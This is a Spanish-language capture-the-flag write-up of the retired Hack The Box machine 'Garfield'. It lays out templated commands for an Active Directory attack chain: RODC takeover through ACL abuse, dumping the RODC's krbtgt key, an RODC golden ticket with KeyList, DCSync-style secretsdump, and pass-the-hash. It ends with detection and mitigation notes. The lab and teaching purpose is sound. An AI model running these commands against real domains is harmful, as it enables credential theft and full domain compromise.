---
machine: Garfield
os: Windows
difficulty: Hard
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, rodc, krbtgt, golden-ticket, keylist, dcsync, pass-the-hash]
---

# Garfield — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Dominio con **dos controladores**: `DC01` y un **RODC**. El camino pasa por comprometer el RODC (`RODC01`), suplantar a Administrator en él, volcar la clave del `krbtgt_8245` y usar un *ticket dorado* con **KeyList** para pedir un TGT válido en `DC01`. De ahí, hash de Administrator y pass-the-hash.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
nxc smb <IP>
nxc ldap <IP> --kerberos
```

Servicios de DC habituales (53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389) y, al enumerar, dos hosts en el dominio `garfield.htb`: `DC01` y `RODC01`.

```bash
nxc smb <IP> -u j.arbuckle -p '<password>' --shares --users --groups
nxc ldap <IP> -u j.arbuckle -p '<password>' --query "(objectClass=*)" "*" --bloodhound --collection All
```

Credenciales iniciales del enunciado: `j.arbuckle`. BloodHound marca las ACLs explotables hacia el RODC y sus cuentas asociadas.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Enumerar el RODC**: quién puede administrarlo y qué cuentas están en su ámbito (*msDS-RevealOnDemandGroup*, *Allowed RODC Password Replication Group*).

```bash
nxc ldap <IP> -u j.arbuckle -p '<password>' \
  --query "(objectClass=*)""(msDS-RevealOnDemandGroup=*)" 
```

2. **Tomar el RODC**: con los permisos encontrados (ACLs de escritura sobre la cuenta de equipo o sobre sus administradores) se obtiene control administrativo de `RODC01` y se ejecuta código como SYSTEM allí.

```bash
bloodyAD -u '<user>' -p '<password>' -d garfield.htb --host rodc01.garfield.htb add genericAll ...
impacket-psexec garfield.htb/'<user>'@rodc01.garfield.htb
```

3. **Suplantar a Administrator en el RODC** y volcar sus secretos: `sekurlsa`/`lsadump` sobre el propio RODC dan la clave del `krbtgt_8245` (AES256) y las credenciales cacheadas del ámbito.

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

El salto a `DC01` se hace con un **ticket dorado del RODC**, no del dominio:

```bash
# Ticket dorado para el krbtgt del RODC (krbtgt_8245)
ticketer.py -nthash <krbtgt_8245_aes256> -domain-sid <SID> \
  -domain garfield.htb -dc-ip <IP> -spn krbtgt_8245 \
  administrator
export KRB5CCNAME=administrator.ccache
```

El RODC no firma TGT para el dominio; por eso hay que añadir la extensión **KeyList** (`-key-list` / MS-PAC `PAC_CREDENTIAL_INFO` con `KERB_..._KEY_LIST`) para que `DC01` acepte el ticket y revele la contraseña de la cuenta. Con el ticket válido:

```bash
secretsdump.py -k -no-pass garfield.htb/administrator@dc01.garfield.htb
# hash NTLM de Administrator
```

```bash
evil-winrm -i dc01.garfield.htb -u administrator -H <hash>
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Confundir los `krbtgt`**: la clave del RODC es `krbtgt_8245`; la del dominio no se obtiene desde el RODC.
- Sin la extensión KeyList, `DC01` rechaza el ticket del RODC.
- Sincronizar hora (`faketime`) o Kerberos falla con `KRB_AP_ERR_SKEW`.
- Revisar `msDS-RevealOnDemandGroup` antes de asumir qué cuentas se pueden volcar.

- Un RODC es un objetivo más débil que el DC y su `krbtgt` propio permite forjar tickets con KeyList.
- Los permisos sobre cuentas de equipo y sus administradores son privilegios de dominio en la práctica.
- Mitigación: auditar ACLs sobre RODCs, restringir el grupo de replicación de contraseñas y monitorizar TGT anómalos con `4769`/`4768`.

## Mitigaciones y detección

- Activar la preautenticación Kerberos, usar contraseñas largas en cuentas de servicio y forzar AES.
- Detección: 4768 con `PreAuthType=0` y 4769 con RC4 fuera de la línea base.
- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
